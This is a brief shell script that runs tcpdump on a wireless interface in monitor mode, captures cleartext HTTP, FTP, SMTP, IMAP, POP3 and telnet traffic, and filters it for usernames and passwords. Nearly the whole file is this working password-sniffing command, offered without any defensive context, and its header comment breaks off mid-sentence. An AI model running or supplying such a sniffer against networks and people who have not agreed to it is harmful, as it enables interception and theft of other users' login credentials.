#By Aaron Becker
#Will search all network interfaces for 
echo "Starting tcpdump";
sudo tcpdump -i en0 -I port http or port ftp or port smtp or port imap or port pop3 or port telnet -lA | egrep -i -B5 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd= |password=|pass:|user:|username:|password:|login:|pass |user '
echo "DONE";